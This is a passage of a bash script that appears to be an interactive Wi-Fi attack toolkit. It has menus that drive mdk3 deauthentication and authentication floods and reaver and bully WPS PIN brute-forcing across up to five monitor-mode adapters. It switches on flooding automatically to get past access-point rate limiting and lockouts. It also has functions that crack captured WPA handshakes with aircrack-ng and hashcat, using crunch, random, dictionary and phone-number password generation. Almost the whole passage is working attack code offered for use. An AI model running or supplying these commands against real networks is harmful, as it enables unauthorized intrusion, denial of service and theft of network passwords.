echo -e ""$blue"4)"$transparent" 4 Adapters "
echo -e ""$blue"5)"$transparent" 5 Adapters"

read a
case $a in
	1)
clear
top
echo
read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;


clear
top
enable_mon_mode_1

sleep 1

clear
top
echo "Would you like to Change the Wlan WIFI_MONITOR's MAC Address?"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Yes"
		echo -e "      "$blue"2)"$transparent" No"


read c
case $c in
	1)
clear
top
mac_change_1

sleep 1

clear
;;
	2)
clear
;;
	*)Invalid Option
;;
esac


menu () {
clear
WPS_ATTACK_MENU

read d
case $d in
	0)
clear
top
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m
menu
;;
	3)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv
menu
;;
	4)
clear
xterm -e "wash -i $WIFI_MONITOR1" &
menu
;;
	5)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC1
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL1
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $mac -c $channel $WIFI_MONITOR1
menu
;;
	8)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC1
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL1
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	2)
clear
top
echo
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
clear
echo
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;

clear

enable_mon_mode_1

enable_mon_mode_2

clear

echo "Would you like to set the 2 WIFI_MONITORs to an Identical MAC Address?"
echo "                                       "
echo -e "      "$blue"1)"$transparent" Yes"
echo -e "      "$blue"2)"$transparent" No"



read f
case $f in
	1)
clear

mac_change_1

mac_change_2

clear
;;
	2)
;;
	*)Invalid Option
;;
esac



menu () {
clear
WPS_ATTACK_MENU

read g
case $g in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m
menu
;;
	3)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv
menu
;;
	4)
clear
xterm -e "wash -i $WIFI_MONITOR1" &
menu
;;
	5)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC2
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL2
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $mac -c $channel $WIFI_MONITOR1
menu
;;
	8)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC2
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL2
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac

}

menu

;;
	3)
clear
top
echo
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
clear
echo
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
clear
echo
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": WIFI_MONITOR3;


clear


enable_mon_mode_1

enable_mon_mode_2

enable_mon_mode_3



clear

top
echo "Would you like to set the 3 WIFI_MONITORs to an Identical MAC Address?"
echo "                                       "
echo -e "      "$blue"1)"$transparent" Yes"
echo -e "      "$blue"2)"$transparent" No"


read i
case $i in
	1)
clear

mac_change_1

mac_change_2

mac_change_3

clear
;;
	2)
;;
	*)Invalid Option
;;
esac


menu () {
clear
WPS_ATTACK_MENU

read j
case $j in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m
menu
;;
	3)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv
menu
;;
	4)
clear
xterm -e "wash -i $WIFI_MONITOR1" &
menu
;;
	5)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC3
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL3
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $mac -c $channel $WIFI_MONITOR1
menu
;;
	8)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC3
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL3
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	4)
clear
top
echo
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
clear
echo
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
clear
echo
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": WIFI_MONITOR3;
clear
echo
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": WIFI_MONITOR4;


clear

enable_mon_mode_1

enable_mon_mode_2

enable_mon_mode_3

enable_mon_mode_4


clear

echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - **************
1)Yes
2)No"

read l
case $l in
	1)
clear

mac_change_1

mac_change_2

mac_change_3

mac_change_4

clear
;;
	2)
;;
	*)Invalid Option
;;
esac

clear

menu () {
clear
WPS_ATTACK_MENU

read m
case $m in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m
menu
;;
	3)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv
menu
;;
	4)
clear
xterm -e "wash -i $WIFI_MONITOR1" &
menu
;;
	5)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC4
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL4
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $mac -c $channel $WIFI_MONITOR1
menu
;;
	8)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC4
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL4
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	5)
clear
top
echo
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
clear
echo
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
clear
echo
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": WIFI_MONITOR3;
clear
echo
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": WIFI_MONITOR4;
clear
echo
read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": WIFI_MONITOR5;


clear

enable_mon_mode_1

enable_mon_mode_2

enable_mon_mode_3

enable_mon_mode_4

enable_mon_mode_5

clear

echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - **************
1)Yes
2)No"

read o
case $o in
	1)
clear

mac_change_1

mac_change_2

mac_change_3

mac_change_4

mac_change_5

clear
;;
	2)
;;
	*)Invalid Option
;;
esac


menu () {
clear
WPS_ATTACK_MENU

read p
case $p in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR5 x 0 -t $mac -n $ssid -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR5 a -a $mac -m
menu
;;
	3)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv
menu
;;
	4)
clear
xterm -e "wash -i $WIFI_MONITOR1" &
menu
;;
	5)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC5
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
reaver_pid=$!

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL5
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $mac -c $channel $WIFI_MONITOR1
menu
;;
	8)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC5
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
bully_pid=$!

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL5
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;

esac

}



function Bruteforce {
clear
top
echo
echo "*** Which Method Would You Like To Use? ***"
echo
echo "1)Crunch       - Generates passwords in sequential order."
echo "2)RandomGen    - Generates passwords randomly (User Defined Char set)."
echo "3)Dictionary   - Tests passwords from a Wordlist or Dictionary."
echo "4)Phone Number - Tests generated phone numbers."
echo "5)Hashcat      - Hashcat (mask based cracking mode)"
echo
echo -n "#> "

read a
case $a in
	1)
clear
top
echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
echo
echo -n "--> "
read CAPLOCATION
cd $CAPLOCATION
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "$CAPNAME"
echo
echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
echo
echo -n "--> "
read BSSID
clear
top
echo "What is the Min password length? ex:5"
echo
echo -n "--> "
read MIN
clear
top
echo "What is the Max password length? ex:16"
echo
echo -n "--> "
read MAX
clear
top
echo "What is the Char. Set you wish to use? "
echo
echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
echo
echo -n "#> "

read b
case $b in
	1)
	CHARSET=0123456789
	clear
;;
	2)
	CHARSET=abcdefghijklmnopqrstuvwxyz
	clear
;;
	3)
	CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZ
	clear
;;
	4)
	CHARSET=0123456789abcdefghijklmnopqrstuvwxyz
	clear
;;
	5)
	CHARSET=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
	clear
;;
	6)
	CHARSET=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
	clear
;;
	7)

clear
top
echo "Enter the characters you wish to use for cracking."
echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
echo
echo -n "--> "
read CHARSET
clear
;;
	*)
Invalid Option
;;
esac

crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
	2)
clear
top
echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
echo
echo -n "--> "
read CAPLOCATION
cd $CAPLOCATION
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "$CAPNAME"
echo
echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
echo
echo -n "--> "
read BSSID
clear
top
echo "What is the password length? ex:16"
echo
echo -n "--> "
read MAX
clear
top
echo "What is the Char. Set you wish to use? "
echo
echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
echo
echo -n "#> "

read c
case $c in
	1)
	CHARSET='0-9'
	clear
;;
	2)
	CHARSET='a-z'
	clear
;;
	3)
	CHARSET='A-Z'
	clear
;;
	4)
	CHARSET='a-z0-9'
	clear
;;
	5)
	CHARSET='A-Z0-9'
	clear
;;
	6)
	CHARSET='A-Z0-9a-z'
	clear
;;
	7)
clear
top
echo "Enter the characters you wish to use for cracking."
echo "Ex: ABCDEF0123456789"
echo
echo -n "--> "
read CHARSET
clear
;;
	*)
Invalid Option
;;
esac

cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
	3)
clear
top
echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
echo
echo -n "--> "
read CAPLOCATION
cd $CAPLOCATION
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
echo
echo -n "--> "
read DICTLOCATION
clear
cd $DICTLOCATION
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your Dictionary file? ex: rockyou.txt"
echo
echo -n "--> "
read DICTNAME
clear
aircrack-ng $CAPLOCATION$CAPNAME -w $DICTLOCATION$DICTNAME
;;
	4)
clear
top
echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
echo
echo -n "--> "
read CAPLOCATION
cd $CAPLOCATION
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "$CAPNAME"
echo
echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
echo
echo -n "--> "
read BSSID
clear
top
echo "What is the Area Code? ex:(530) "
echo
echo -n "--> "
read AREACODE
clear
top
echo -e "[-] Select a phone number format:"
echo ""
echo -e "[1] (555)555-5555  [13 chars]"
echo -e "[2] 555-555-1234   [12 chars]"
echo -e "[3] 5555555555     [10 chars]"
echo -e "[4] 555-1234       [ 8 chars]"
echo -e "[5] 5551234        [ 7 chars]"
echo
echo -n "#> "


read j
case $j in
	1)
clear
crunch 13 13 -t \($AREACODE\)%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
	2)
clear
crunch 12 12 -t $AREACODE\-%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
	3)
clear
crunch 10 10 -t $AREACODE%%%%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
	4)
clear
crunch 8 8 -t %%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
	5)
clear
crunch 7 7 -t %%%%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
;;
esac
;;
	5)
clear
top
echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
echo
echo -n "--> "
read CAPLOCATION
cd $CAPLOCATION
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "Will now convert .cap to .hccap ,Please wait..."
sleep 3
clear
top
wpaclean $CAPLOCATION$CAPNAME"wpacleaned".cap $CAPLOCATION$CAPNAME
clear
top
aircrack-ng $CAPLOCATION$CAPNAME"wpacleaned".cap -J $CAPLOCATION$CAPNAME
clear
top
rm $CAPLOCATION$CAPNAME"wpacleaned".cap
echo "Conversion Complete!!..."
sleep 3
clear
top
echo "Enter the MASK you wish to use for cracking."
echo
echo "?l = abcdefghijklmnopqrstuvwxyz"
echo "?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ"
echo "?d = 0123456789"
echo "?s = !”#$%&'()*+,-./:;⇔?@[\]^_ ..."
echo
echo "?a = ?l?u?d?s"
echo
echo "Example: Apple123 = Apple?d?d?d"
echo
echo -n "--> "
read MASK
clear
top
hashcat -m 2500 -a 3 $CAPLOCATION$CAPNAME.hccap $MASK
;;
	*)
Invalid Option
;;
esac


}



function Bruteforce2 {

BSSID="$Host_MAC"
CAPNAME="$Host_SSID-$Host_MAC.cap"
clear
top
echo
echo "*** Which Method Would You Like To Use? ***"
echo
echo "1)Crunch       - Generates passwords in sequential order."
echo "2)RandomGen    - Generates passwords randomly (User Defined Char set)."
echo "3)Dictionary   - Tests passwords from a Wordlist or Dictionary."
echo "4)Phone Number - Tests generated phone numbers."
echo "5)Hashcat      - Hashcat (Mask based cracking mode)"
echo
echo -n "#> "

read a
case $a in
	1)

cd $HANDSHAKES_PATH
clear
top
echo "What is the Min password length? ex:5"
echo
echo -n "--> "
read MIN
clear
top
echo "What is the Max password length? ex:16"
echo
echo -n "--> "
read MAX
clear
top
echo "What is the Char. Set you wish to use? "
echo
echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
echo
echo -n "#> "

read b
case $b in
	1)
	CHARSET=0123456789
	clear
;;
	2)
	CHARSET=abcdefghijklmnopqrstuvwxyz
	clear
;;
	3)
	CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZ
	clear
;;
	4)
	CHARSET=0123456789abcdefghijklmnopqrstuvwxyz
	clear
;;
	5)
	CHARSET=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
	clear
;;
	6)
	CHARSET=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
	clear
;;
	7)

clear
top
echo "Enter the characters you wish to use for cracking."
echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
echo
echo -n "--> "
read CHARSET
clear
;;
	*)
Invalid Option
;;
esac

crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
	2)

cd $HANDSHAKES_PATH

clear
top
echo "What is the password length? ex:16"
echo
echo -n "--> "
read MAX
clear
top
echo "What is the Char. Set you wish to use? "
echo
echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
echo
echo -n "#> "

read c
case $c in
	1)
	CHARSET='0-9'
	clear
;;
	2)
	CHARSET='a-z'
	clear
;;
	3)
	CHARSET='A-Z'
	clear
;;
	4)
	CHARSET='a-z0-9'
	clear
;;
	5)
	CHARSET='A-Z0-9'
	clear
;;
	6)
	CHARSET='A-Z0-9a-z'
	clear
;;
	7)
clear
top
echo "Enter the characters you wish to use for cracking."
echo "Ex: ABCDEF0123456789"
echo
echo -n "--> "
read CHARSET
clear
;;
	*)
Invalid Option
;;
esac

cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
	3)

cd $HANDSHAKES_PATH
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
echo
echo -n "--> "
read DICTLOCATION
clear
cd $DICTLOCATION
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your Dictionary file? ex: rockyou.txt"
echo
echo -n "--> "
read DICTNAME
clear
aircrack-ng $HANDSHAKES_PATH$CAPNAME -w $DICTLOCATION$DICTNAME
;;
	4)

cd $HANDSHAKES_PATH

clear
top
echo "What is the Area Code? ex:(530) "
echo
echo -n "--> "
read AREACODE
clear
top
echo -e "[-] Select a phone number format:"
echo ""
echo -e "[1] (555)555-5555  [13 chars]"
echo -e "[2] 555-555-1234   [12 chars]"
echo -e "[3] 5555555555     [10 chars]"
echo -e "[4] 555-1234       [ 8 chars]"
echo -e "[5] 5551234        [ 7 chars]"
echo
echo -n "#> "


read j
case $j in
	1)
clear
crunch 13 13 -t \($AREACODE\)%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
	2)
clear
crunch 12 12 -t $AREACODE\-%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
	3)
clear
crunch 10 10 -t $AREACODE%%%%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
	4)
clear
crunch 8 8 -t %%%\-%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
	5)
clear
crunch 7 7 -t %%%%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
;;
esac
;;
	5)
clear
top
echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
echo
echo -n "--> "
read CAPLOCATION
cd $CAPLOCATION
clear
top
echo "Here are the files in the location you entered:"
echo
ls
echo
echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
echo
echo -n "--> "
read CAPNAME
clear
top
echo "Will now convert .cap to .hccap ,Please wait..."
sleep 3
clear
top
wpaclean $CAPLOCATION$CAPNAME"wpacleaned".cap $CAPLOCATION$CAPNAME
clear
top
aircrack-ng $CAPLOCATION$CAPNAME"wpacleaned".cap -J $CAPLOCATION$CAPNAME
clear
top
rm $CAPLOCATION$CAPNAME"wpacleaned".cap
